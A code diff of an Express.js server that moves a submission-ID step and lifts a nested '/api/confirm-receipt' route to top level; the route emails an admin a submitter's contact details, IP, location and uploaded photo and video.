@@ -195,19 +195,6 @@ app.post(
 
             );
 
-            const submissionId =
-                randomUUID();
-
-            pendingSubmissions.set(
-                submissionId,
-                {
-                    submission: submission,
-                    photoPath: photo.path,
-                    videoPath: video.path
-                }
-            );
-
-
             console.log(
                 'Email:',
                 email
@@ -374,6 +361,18 @@ app.post(
 
             );
 
+            const submissionId =
+                randomUUID();
+
+            pendingSubmissions.set(
+                submissionId,
+                {
+                    submission: submission,
+                    photoPath: photo.path,
+                    videoPath: video.path
+                }
+            );
+
 
             console.log(
                 '-------------------------'
@@ -434,97 +433,100 @@ app.post(
 
                 });
 
-                // =======================================
-                // CONFIRM RECEIPT + SEND ADMIN EMAIL
-                // =======================================
-
-                app.post(
-                    '/api/confirm-receipt',
-
-                    async (req, res) => {
-
-                        try {
-
-                            const pendingSubmission =
-                                pendingSubmissions.get(req.body.submissionId);
-
-                            if (!pendingSubmission) {
-                                return res.status(404).json({
-                                    success: false,
-                                    message: 'Submission is no longer available.'
-                                });
-                            }
-
-                            if (!resend || !process.env.RESEND_FROM_EMAIL) {
-                                return res.status(503).json({
-                                    success: false,
-                                    message: 'Resend is not configured.'
-                                });
-                            }
-
-                            const submission =
-                                pendingSubmission.submission;
-
-                            const emailResult =
-                                await resend.emails.send({
-                                    from: process.env.RESEND_FROM_EMAIL,
-                                    to: RESEND_RECIPIENT_EMAIL,
-                                    subject: `New receipt submission: ${submission.email}`,
-                                    text: [
-                                        'New receipt submission',
-                                        `Email: ${submission.email}`,
-                                        `Name: ${submission.name || 'Not provided'}`,
-                                        `Phone: ${submission.phone || 'Not provided'}`,
-                                        `IP address: ${submission.ipAddress}`,
-                                        `Submitted at: ${submission.submittedAt}`,
-                                        `Latitude: ${submission.latitude || 'Not provided'}`,
-                                        `Longitude: ${submission.longitude || 'Not provided'}`,
-                                        `Accuracy: ${submission.accuracy || 'Not provided'}`
-                                    ].join('\n'),
-                                    attachments: [
-                                        {
-                                            filename: submission.photo,
-                                            content: fs.readFileSync(
-                                                pendingSubmission.photoPath
-                                            )
-                                        },
-                                        {
-                                            filename: submission.video,
-                                            content: fs.readFileSync(
-                                                pendingSubmission.videoPath
-                                            )
-                                        }
-                                    ]
-                                });
-
-                            if (emailResult.error) {
-                                throw emailResult.error;
-                            }
-
-                            pendingSubmissions.delete(req.body.submissionId);
-
-                            res.json({
-                                success: true
-                            });
-
-                        } catch (error) {
-
-                            console.error(error);
-
-                            res.status(500).json({
-                                success: false,
-                                message: 'Unable to send receipt details.'
-                            });
-                        }
-
-                    }
-                );
-
         }
 
     }
 
 );
+
+// =======================================
+// CONFIRM RECEIPT + SEND ADMIN EMAIL
+// =======================================
+
+app.post(
+    '/api/confirm-receipt',
+
+    async (req, res) => {
+
+        try {
+
+            const pendingSubmission =
+                pendingSubmissions.get(req.body.submissionId);
+
+            if (!pendingSubmission) {
+                return res.status(404).json({
+                    success: false,
+                    message: 'Submission is no longer available.'
+                });
+            }
+
+            if (!resend || !process.env.RESEND_FROM_EMAIL) {
+                return res.status(503).json({
+                    success: false,
+                    message: 'Resend is not configured.'
+                });
+            }
+
+            const submission =
+                pendingSubmission.submission;
+
+            const emailResult =
+                await resend.emails.send({
+                    from: process.env.RESEND_FROM_EMAIL,
+                    to: RESEND_RECIPIENT_EMAIL,
+                    subject: `New receipt submission: ${submission.email}`,
+                    text: [
+                        'New receipt submission',
+                        `Email: ${submission.email}`,
+                        `Name: ${submission.name || 'Not provided'}`,
+                        `Phone: ${submission.phone || 'Not provided'}`,
+                        `IP address: ${submission.ipAddress}`,
+                        `Submitted at: ${submission.submittedAt}`,
+                        `Latitude: ${submission.latitude || 'Not provided'}`,
+                        `Longitude: ${submission.longitude || 'Not provided'}`,
+                        `Accuracy: ${submission.accuracy || 'Not provided'}`
+                    ].join('\n'),
+                    attachments: [
+                        {
+                            filename: submission.photo,
+                            content: fs.readFileSync(
+                                pendingSubmission.photoPath
+                            )
+                        },
+                        {
+                            filename: submission.video,
+                            content: fs.readFileSync(
+                                pendingSubmission.videoPath
+                            )
+                        }
+                    ]
+                });
+
+            if (emailResult.error) {
+                throw emailResult.error;
+            }
+
+            pendingSubmissions.delete(req.body.submissionId);
+
+            res.json({
+                success: true
+            });
+
+        } catch (error) {
+
+            console.error(error);
+
+            res.status(500).json({
+                success: false,
+                message:
+                    error?.message ||
+                    'Unable to send receipt details.'
+            });
+        }
+
+    }
+);
+
 // SAVE LOCATION
 app.post('/api/save-location', (req, res) => {
 
